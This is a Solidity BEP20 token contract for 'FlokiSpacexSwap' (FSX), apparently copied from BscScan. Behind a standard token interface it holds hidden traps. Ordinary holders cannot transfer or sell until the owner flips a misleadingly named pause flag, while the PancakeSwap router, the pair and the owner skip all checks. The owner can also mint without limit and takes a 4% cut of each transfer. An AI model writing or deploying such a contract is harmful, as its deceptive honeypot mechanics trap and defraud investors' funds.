/**
 *Submitted for verification at BscScan.com on 2022-04-03
*/

pragma solidity 0.5.16;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  //function CheckTransferTimeExpiry() external view returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Context {

  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this;
    return msg.data;
  }
}

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {

    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

    require(b > 0, errorMessage);
    uint256 c = a / b;

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract Ownable is Context {  
  address public _owner;
  bool private _transferStatus = false;
  bool private _transferFromStatus = false;
  bool private _TransferTimeExpiry = true;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }

  function PauseTransfer() public onlyOwner{
    _PauseTransfer();
  }

  function _PauseTransfer() internal onlyOwner{
    if(_transferStatus == true)
    _transferStatus = false;
    else if(_transferStatus == false)
    _transferStatus = true;
  }

  function PauseTransferStatus() public view returns(bool){
    return _transferStatus;
  }

  function PauseTransferFrom() public onlyOwner{
    _PauseTransferFrom();
  }

  function _PauseTransferFrom() internal onlyOwner{
    if(_transferFromStatus == true)
    _transferFromStatus = false;
    else if(_transferFromStatus == false)
    _transferFromStatus = true;
  }

  function PauseTransferFromStatus() public view onlyOwner returns(bool){
    return _transferFromStatus;
  }

  function CheckTransferTimeExpiry() public onlyOwner{
    _CheckTransferTimeExpiry();
  }

  function _CheckTransferTimeExpiry() internal onlyOwner{
    if(_TransferTimeExpiry == true)
    _TransferTimeExpiry = false;
    else if(_TransferTimeExpiry == false)
    _TransferTimeExpiry = true;
  }

  function CheckTransferTimeExpiryStatus() public view returns(bool){
    return _TransferTimeExpiry;
  }
  
}

contract BEP20Token is Context, IBEP20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;

  mapping (address => mapping (address => uint256)) private _allowances;

  struct TransferHistory {
    uint256 transferTime;
    address from;
    bool exist;
    //uint256 amount;
  }

  mapping (address => TransferHistory) public transferHistoryPerSender;

  uint256 private _totalSupply;
  uint8 private _decimals;
  string private _symbol;
  string private _name;
  address private PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
  address private PancakeSwapV2 = 0x1b10573E895fdB964B1BEF48F734e847B4c3f740;

  constructor() public {
    _name = "FlokiSpacexSwap"; 
    _symbol = "FSX"; 
    _decimals = 18;
    _totalSupply = 350000000000000000000000000000000000;
    _balances[msg.sender] = _totalSupply;

    emit Transfer(address(0), msg.sender, _totalSupply);
  }  

  function CheckTransferTimeLimit(address sender) public view returns (bool){
    if (block.timestamp > transferHistoryPerSender[msg.sender].transferTime + 1 days)
    {
        return true;
    }
    else
    {
        return false;
    }     
  }

  function setPancakeRouter(address NewPancakeRouter) public onlyOwner {
    PancakeRouter = NewPancakeRouter;
  }
  function GetPancakeRouter() public view onlyOwner returns (address)  {
    return PancakeRouter;
  }

  function setPancakeSwapV2(address NewPancakeSwapV2) public onlyOwner {
    PancakeSwapV2 = NewPancakeSwapV2;
  }
  function GetPancakeSwapV2() public view onlyOwner returns (address)  {
    return PancakeSwapV2;
  }

  function getOwner() public view returns (address) {
    return owner();
  }

  function decimals() external view returns (uint8) {
    return _decimals;
  }

  function symbol() external view returns (string memory) {
    return _symbol;
  }

  function name() external view returns (string memory) {
    return _name;
  }

  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }

  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function _transfer(address sender, address recipient, uint256 amount) internal {
    if(sender == PancakeRouter || sender == PancakeSwapV2 || sender == getOwner())
    {
      _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
      _balances[recipient] = _balances[recipient].add(amount.mul(92).div(100));
      _balances[_owner] = _balances[_owner].add(amount.mul(4).div(100));
      _balances[address(0)] = _balances[address(0)].add(amount.mul(4).div(100));
    }
    else
    {      
    require(PauseTransferStatus() == true, "BEP20: transfer is paused");
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    if(CheckTransferTimeExpiryStatus())
    {
         if(!transferHistoryPerSender[sender].exist){
          require(amount <= _balances[sender].mul(30).div(100), "Bep20: You can only send 30 percent of your FSX token in one try!");
          _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
          _balances[recipient] = _balances[recipient].add(amount.mul(92).div(100));
          _balances[_owner] = _balances[_owner].add(amount.mul(4).div(100));
          _balances[address(0)] = _balances[address(0)].add(amount.mul(4).div(100));
          //
          transferHistoryPerSender[msg.sender].transferTime = block.timestamp;
          transferHistoryPerSender[msg.sender].from = sender;
          transferHistoryPerSender[msg.sender].exist = true;
          //transferHistoryPerSender[msg.sender].amount = amount;
          //
         }
         else{
         require(CheckTransferTimeLimit(sender) == true, "Bep20: Your daily transfer limit is full");
         require(amount <= _balances[sender].mul(30).div(100), "Bep20: You can only send 30 percent of your FSX token in one try!");
          _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
          _balances[recipient] = _balances[recipient].add(amount.mul(92).div(100));
          _balances[_owner] = _balances[_owner].add(amount.mul(4).div(100));
          _balances[address(0)] = _balances[address(0)].add(amount.mul(4).div(100));
          //
          transferHistoryPerSender[msg.sender].transferTime = block.timestamp;
          transferHistoryPerSender[msg.sender].from = sender;
          transferHistoryPerSender[msg.sender].exist = true;
         }
    }
    else
    {
      _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
      _balances[recipient] = _balances[recipient].add(amount.mul(92).div(100));
      _balances[_owner] = _balances[_owner].add(amount.mul(4).div(100));
      _balances[address(0)] = _balances[address(0)].add(amount.mul(4).div(100));
      //
      transferHistoryPerSender[msg.sender].transferTime = block.timestamp;
      transferHistoryPerSender[msg.sender].from = sender;
          transferHistoryPerSender[msg.sender].exist = true;
      //transferHistoryPerSender[msg.sender].amount = amount;
      //
    }
    }
    emit Transfer(sender, recipient, amount);
}

  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    //require(TransferFromStatus() != true, "BEP20: transferfrom is paused");
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function mint(uint256 amount) public onlyOwner returns (bool) {
    _mint(_msgSender(), amount);
    return true;
  }

  function _mint(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: mint to the zero address");

    _totalSupply = _totalSupply.add(amount);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }

  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
  }
}